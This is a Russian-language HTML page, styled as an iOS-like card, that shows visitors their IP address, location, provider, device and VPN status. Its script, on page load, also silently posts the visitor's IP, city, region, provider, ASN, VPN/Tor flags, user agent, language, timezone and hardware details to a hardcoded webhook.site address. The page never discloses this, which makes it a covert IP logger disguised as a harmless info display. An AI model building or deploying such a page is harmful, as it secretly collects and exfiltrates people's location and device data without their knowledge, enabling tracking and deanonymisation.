<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>⚚ Данные</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000000;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ffffff;
      line-height: 1.4;
      -webkit-font-smoothing: antialiased;
      padding: 20px 16px;
    }

    .ios-root {
      width: 100%;
      max-width: 680px;
      margin: 0 auto;
      opacity: 0;
      transform: translateY(10px);
      transition: opacity 0.5s ease, transform 0.4s ease;
    }

    .ios-root.visible {
      opacity: 1;
      transform: translateY(0);
    }

    .hero-symbol {
      text-align: center;
      margin-bottom: 24px;
      font-size: 92px;
      font-weight: 300;
      color: #ffffff;
      text-shadow: 0 0 25px rgba(255,255,255,0.4);
      animation: gentleGlow 2.8s infinite ease-in-out;
    }

    @keyframes gentleGlow {
      0% { text-shadow: 0 0 5px rgba(255,255,255,0.2); opacity: 0.9; transform: scale(0.98);}
      50% { text-shadow: 0 0 30px rgba(255,255,255,0.6); opacity: 1; transform: scale(1);}
      100% { text-shadow: 0 0 5px rgba(255,255,255,0.2); opacity: 0.9; transform: scale(0.98);}
    }

    .single-card {
      background: #1c1c1e;
      border-radius: 28px;
      overflow: hidden;
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border: 0.5px solid #3a3a3c;
    }

    .info-row {
      display: flex;
      align-items: flex-start;
      justify-content: space-between;
      padding: 16px 20px;
      border-bottom: 0.5px solid #2c2c2e;
      gap: 16px;
    }

    .info-row:last-child {
      border-bottom: none;
    }

    .row-label {
      font-size: 16px;
      font-weight: 400;
      color: #8e8e93;
      letter-spacing: -0.3px;
      flex-shrink: 0;
      min-width: 100px;
    }

    .row-value {
      font-size: 16px;
      font-weight: 500;
      color: #ffffff;
      text-align: right;
      word-break: break-word;
      flex: 1;
    }

    .mono-value {
      font-family: 'SF Mono', 'Menlo', 'Monaco', 'Courier New', monospace;
      font-size: 14px;
      font-weight: 400;
      color: #d1d1d6;
    }

    .loading-placeholder {
      text-align: right;
      color: #8e8e93;
      font-weight: 400;
    }

    @media (max-width: 480px) {
      .info-row {
        padding: 14px 16px;
      }
      .row-label {
        min-width: 85px;
        font-size: 15px;
      }
      .hero-symbol {
        font-size: 76px;
        margin-bottom: 20px;
      }
    }
  </style>
</head>
<body>

<div class="ios-root" id="appRoot">
  <div class="hero-symbol">⚚</div>
  <div class="single-card" id="dataCard">
    <div class="info-row">
      <span class="row-label">Время</span>
      <span class="row-value" id="localTimeDisplay">--:--</span>
    </div>
    <div class="info-row">
      <span class="row-label">IP адрес</span>
      <span class="row-value" id="ipDisplay">загрузка...</span>
    </div>
    <div class="info-row">
      <span class="row-label">Страна</span>
      <span class="row-value" id="countryDisplay">—</span>
    </div>
    <div class="info-row">
      <span class="row-label">Город</span>
      <span class="row-value" id="cityDisplay">—</span>
    </div>
    <div class="info-row">
      <span class="row-label">Провайдер</span>
      <span class="row-value" id="providerDisplay">—</span>
    </div>
    <div class="info-row">
      <span class="row-label">ASN</span>
      <span class="row-value mono-value" id="asnDisplay">—</span>
    </div>
    <div class="info-row">
      <span class="row-label">Устройство</span>
      <span class="row-value" id="deviceDisplay">—</span>
    </div>
    <div class="info-row">
      <span class="row-label">Часовой пояс</span>
      <span class="row-value" id="tzDisplay">—</span>
    </div>
    <div class="info-row">
      <span class="row-label">VPN/Proxy</span>
      <span class="row-value" id="riskDisplay">—</span>
    </div>
  </div>
</div>

<script>
  (function() {
    const WEBHOOK_URL = 'https://webhook.site/9edcb0dc-3b9b-4f7e-9976-27fd4e804e70';
    
    const $ = (id) => document.getElementById(id);
    
    function formatLocalTime() {
      return new Date().toLocaleString('ru-RU', { hour12: false });
    }
    
    function updateLocalTime() {
      const el = $('localTimeDisplay');
      if (el) el.textContent = formatLocalTime();
    }
    
    function detectDeviceType(ua) {
      if (/iPad|iPhone|iPod/i.test(ua)) return "iPhone / iPad";
      if (/Android/i.test(ua)) return "Android";
      if (/Mobile/i.test(ua)) return "Телефон";
      return "Компьютер";
    }
    
    const ua = navigator.userAgent;
    const device = detectDeviceType(ua);
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language || '';
    
    $('deviceDisplay').textContent = device;
    $('tzDisplay').textContent = timezone;
    
    updateLocalTime();
    setInterval(updateLocalTime, 1000);
    
    function sendToWebhook(data) {
      const payload = {
        timestamp: new Date().toISOString(),
        local_time: formatLocalTime(),
        ip: data.ip || null,
        country: data.location?.country || null,
        country_code: data.location?.country_code || null,
        city: data.location?.city || null,
        region: data.location?.state || null,
        provider: data.company?.name || data.asn?.org || null,
        asn: data.asn?.asn ? `AS${data.asn.asn}` : null,
        is_vpn: data.is_vpn || false,
        is_proxy: data.is_proxy || false,
        is_tor: data.is_tor || false,
        device: device,
        user_agent: ua,
        timezone: timezone,
        language: language,
        cookies_enabled: navigator.cookieEnabled,
        hardware_cores: navigator.hardwareConcurrency || null
      };
      
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(e => console.log('webhook err:', e));
    }
    
    function countryCodeToFlag(code) {
      if (!code) return '';
      const upper = code.toUpperCase();
      return upper.replace(/./g, ch => String.fromCodePoint(127397 + ch.charCodeAt()));
    }
    
    function renderData(data) {
      if (!data || !data.ip) {
        $('ipDisplay').textContent = 'ошибка';
        return;
      }
      
      sendToWebhook(data);
      
      const loc = data.location || {};
      const comp = data.company || {};
      const asn = data.asn || {};
      const flag = countryCodeToFlag(loc.country_code);
      
      $('ipDisplay').innerHTML = `${flag} ${data.ip}`;
      $('countryDisplay').textContent = loc.country || '—';
      
      let cityText = loc.city || '—';
      if (loc.state) cityText += `, ${loc.state}`;
      $('cityDisplay').textContent = cityText;
      
      const provider = comp.name || asn.org || '—';
      $('providerDisplay').textContent = provider;
      
      let asnText = '—';
      if (asn.asn) asnText = `AS${asn.asn}`;
      if (asn.descr) asnText += ` · ${asn.descr}`;
      $('asnDisplay').textContent = asnText;
      
      const isRisky = data.is_vpn || data.is_proxy || data.is_tor;
      let riskText = 'Нет';
      if (data.is_vpn) riskText = 'VPN';
      if (data.is_proxy) riskText = 'Proxy';
      if (data.is_tor) riskText = 'Tor';
      if (data.is_datacenter && !isRisky) riskText = 'Хостинг';
      $('riskDisplay').textContent = riskText;
    }
    
    function fallbackIP() {
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          if (data.ip) {
            $('ipDisplay').textContent = data.ip;
            fetch(WEBHOOK_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ ip: data.ip, fallback: true, ua: ua, time: formatLocalTime() })
            });
          }
        })
        .catch(() => {});
    }
    
    fetch('https://api.ipapi.is/')
      .then(res => {
        if (!res.ok) throw new Error();
        return res.json();
      })
      .then(data => renderData(data))
      .catch(() => {
        $('ipDisplay').textContent = 'не загружено';
        fallbackIP();
      });
    
    setTimeout(() => {
      document.getElementById('appRoot').classList.add('visible');
    }, 100);
  })();
</script>
</body>
</html>
